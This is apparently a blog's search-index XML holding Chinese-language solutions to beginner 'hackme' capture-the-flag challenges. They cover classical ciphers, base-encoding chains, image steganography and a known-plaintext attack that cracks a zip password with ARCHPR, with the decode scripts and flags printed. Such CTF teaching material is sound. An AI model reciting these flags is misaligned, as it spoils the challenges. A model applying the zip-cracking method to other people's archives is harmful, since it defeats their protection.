            <tag> substitution cipher </tag>
            
            <tag> vigenere </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>classic cipher 1</title>
      <link href="/2019/09/30/classic-cipher-1/"/>
      <url>/2019/09/30/classic-cipher-1/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-classic-cipher-1"><a href="#src-hackme-classic-cipher-1" class="headerlink" title="[src = hackme] classic cipher 1"></a>[src = hackme] classic cipher 1</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MTHJ&#123;CWTNXRJCUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125;</span><br><span class="line">Solve this substitution cipher</span><br></pre></td></tr></table></figure> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目提示是代换密码（substitution cipher），代换密码的种类并不多，在线工具很多，直接在线解码即可。<a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a>就是一个不错得到平台，根据flag的特点：MTHJ应该对应FLAG，可以作为clues使用。<br>即可得到flag：</p><p><img src="./classiccipher1.PNG" alt="classcipher1"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对经典密码算法的理解，建议找一本基础密码学的书来学习一下密码学的基本原理！</p>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 古典密码 </tag>
            
            <tag> substitution cipher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>not hard</title>
      <link href="/2019/09/30/not-hard/"/>
      <url>/2019/09/30/not-hard/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-not-hard"><a href="#src-hackme-not-hard" class="headerlink" title="[src = hackme] not hard"></a>[src = hackme] not hard</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Nm@rmLsBy&#123;Nm5u-K&#123;iZKPgPMzS2I*lPc%_SMOjQ#O;uV&#123;MM*?PPFhk|Hd;hVPFhq&#123;HaAH&lt;</span><br><span class="line">Tips: pydoc3 base64</span><br></pre></td></tr></table></figure> <a id="more"></a><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目给出了一段编码，题目提示base64，但显然不是base64编码，通过pydoc查看base64库函数，发现其与base85接近。<br><img src="./base64.PNG" alt="base64"></p><p>直接python脚本对其进行base85解码得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'IZGECR33IRXSA6LPOUQGW3TPO4QGEYLTMUZTEIDFNZRW6ZDJNZTT67I='</span></span><br></pre></td></tr></table></figure><p>发现是base32编码，再次解码得到flag。</p><p>完整解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">c=base64.b85decode(<span class="string">"Nm@rmLsBy&#123;Nm5u-K&#123;iZKPgPMzS2I*lPc%_SMOjQ#O;uV&#123;MM*?PPFhk|Hd;hVPFhq&#123;HaAH&lt;"</span>)</span><br><span class="line">print(c)</span><br><span class="line">print(base64.b32decode(c))</span><br></pre></td></tr></table></figure><p>脚本输出flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'FLAG&#123;Do you know base32 encoding?&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对base编码家族的理解，遇到问题查阅文档也是一个好习惯！</p>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>television</title>
      <link href="/2019/09/30/television/"/>
      <url>/2019/09/30/television/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-television"><a href="#src-hackme-television" class="headerlink" title="[src = hackme] television"></a>[src = hackme] television</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Looks like my television was broken<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>打开是一张图片：<br><img src="./television.bmp" alt="television" title="televison"></p><p>用二进制编辑器010 Editor打开，搜索字符串：Search–&gt;Find Strings:最小长度设置为10，得到flag：<br><img src="./telestr.png" alt="telestr" title="telestr"></p><h2 id="关键字"><a href="#关键字" class="headerlink" title="[关键字]"></a>[关键字]</h2><p>图片信息隐藏，010 Editor</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核二进制编辑器的使用，其他的二进制编辑器还有很多，比如UltraEdit，WinHex；<br>C32ASm是一款非常好用的反汇编程序，其也可以用来进行十六进制编辑</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片信息隐藏 </tag>
            
            <tag> 010 Editor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>meow</title>
      <link href="/2019/09/29/meow/"/>
      <url>/2019/09/29/meow/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-meow"><a href="#src-hackme-meow" class="headerlink" title="[src = hackme] meow"></a>[src = hackme] meow</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Pusheen is cute!<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>打开是一张图片：<br><img src="./meow.png" alt="meow"></p><p>放到KALI里面，用binwalk查看，发现里面包含多个文件：<br><img src="./binwalk.PNG" alt="meow"></p><p>用foremost进行分离，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost meow.png</span><br></pre></td></tr></table></figure><p>得到两个文件夹png和zip，png文件夹下为一张图片00000000.png，zip下为一个压缩包00000094.zip，打开需要密码，因此关键是破解压缩文件夹的密码。<br>首先分析一下该zip压缩包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip -v 00000094.zip</span><br></pre></td></tr></table></figure><p>得到<br><img src="./unzip.PNG" alt="unzip"><br>看到该压缩包里包含flag文件和另外一张图片，图片的CRC32为cdad52bd.</p><p>将已经解压得到的图片00000000.png压缩比较CRC32值，发现相同，猜测是同一张图片<br><img src="./zip.PNG" alt="zip"><br>因此可考虑图片的已知明文攻击，大致原理是当你不知道一个zip的密码，但是有zip中的一个已知文件（文件大小要大于12Byte）或者已经通过其他手段知道zip加密文件中的某些内容时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件，此时我们可以尝试用ARCHPR或者pkcrack进行明文攻击。</p><p>在这里我们使用ARCHPR进行破解，如图所示：<br><img src="./ARCHPR.PNG" alt="ARCHPR"><br>在加密的ZIP/RAR/ACE/ARJ文件处选择要破解的压缩包，攻击类型选择明文，在明文文件路径选择我们用zip压缩得到的00.zip。然后开始破解。<br>破解完成后将破解后的压缩包00000094_decrypted.zip解压（ARCHPR得到的是一个已经没有密码的压缩包），打开其中的flag文件，得到flag：<br><img src="./flag.PNG" alt="flag"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>本题考核Linux系统基本命令的使用：binwalk，foremost，unzip，zip等；<br>同时考察压缩包解压密码破解的基本方法：爆破攻击，伪加密，已知明文攻击，本题考察的是已知明文攻击，可用的工具有ARCHPR（Windows）和pkcrack（Linux）。</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息隐藏 </tag>
            
            <tag> pkcrack </tag>
            
            <tag> APCHPR </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>r-u-kidding</title>
      <link href="/2019/09/29/r-u-kidding/"/>
      <url>/2019/09/29/r-u-kidding/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-r-u-kidding"><a href="#src-hackme-r-u-kidding" class="headerlink" title="[src = hackme] r u kidding"></a>[src = hackme] r u kidding</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>EKZF{Hs’r snnn dzrx, itrs bzdrzq bhogdq}<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>比较容易判断应该是凯撒密码：根据flag格式，则EKZF应该对应FLAG，简单判断就是所有字符向后移动1位，可手动解码，但效率较低。对于这种经典的密码算法，网上有很多现成的在线解码器或离线解码器，直接解码即可，如下图基于<a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">http://ctf.ssleye.com/</a> 在线工具平台的凯撒密码工具在线解密。</p><p><img src="./i.PNG" alt="i"></p><p>当然也可以自己编程解决，再次不再赘述。</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对古典密码的理解，凯撒密码是最为古老的密码算法之一</p>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CRYPTO </tag>
            
            <tag> 凯撒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>easy</title>
      <link href="/2019/09/29/easy/"/>
      <url>/2019/09/29/easy/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-easy"><a href="#src-hackme-easy" class="headerlink" title="[src = hackme] easy"></a>[src = hackme] easy</h2><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>526b78425233745561476c7a49476c7a4947566863336b7349484a705a3268305033303d<br> <a id="more"></a></p><h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><p>题目给出了一段16进制数，使用python3的bytes.fromhex()进行转化发现是base64编码。<br>直接python脚本对其进行base64解码得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">c =<span class="string">"526b78425233745561476c7a49476c7a4947566863336b7349484a705a3268305033303d"</span></span><br><span class="line">print(base64.b64decode(bytes.fromhex(c)))</span><br></pre></td></tr></table></figure><p>程序输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'FLAG&#123;This is easy, right?&#125;'</span></span><br></pre></td></tr></table></figure><h2 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h2><p>本题考核对编码的理解，16进制编码以及使用非常之多的base64，还有基于python编写脚本的能力</p>]]></content>
      
      
      <categories>
          
          <category> CRYPTO </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>corgi-can-fly</title>
      <link href="/2019/09/29/corgi-can-fly/"/>
      <url>/2019/09/29/corgi-can-fly/</url>
      
        <content type="html"><![CDATA[<h2 id="src-hackme-corgi-can-fly"><a href="#src-hackme-corgi-can-fly" class="headerlink" title="[src = hackme] corgi can fly"></a>[src = hackme] corgi can fly</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>Corgi is cute, right?<br> <a id="more"></a><br>Pillow (Python) and Bitmap (.NET) are your friends.</p><p>(Maybe you can try stegsolve)</p><h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>打开显示一张图片，典型是一个图片信息隐藏题目：</p><img src="./corgi-can-fly.png" width="400"><p>题目描述已经提示了使用用stegsolve，因此用图片查看工具StegSolve工具打开并查看得到二维码，扫码得到flag：<br><img src="./erweima.PNG" width="400"></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="[知识点]"></a>[知识点]</h3><p>StegSolve是一款查看图片隐写的工具，在较为简单的图片隐写题目中常用。关于该工具的使用和原理可参考：<a href="https://www.cnblogs.com/cat47/p/11483478.html" target="_blank" rel="noopener">https://www.cnblogs.com/cat47/p/11483478.html</a></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片信息隐藏 </tag>
            
            <tag> StegSolve </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
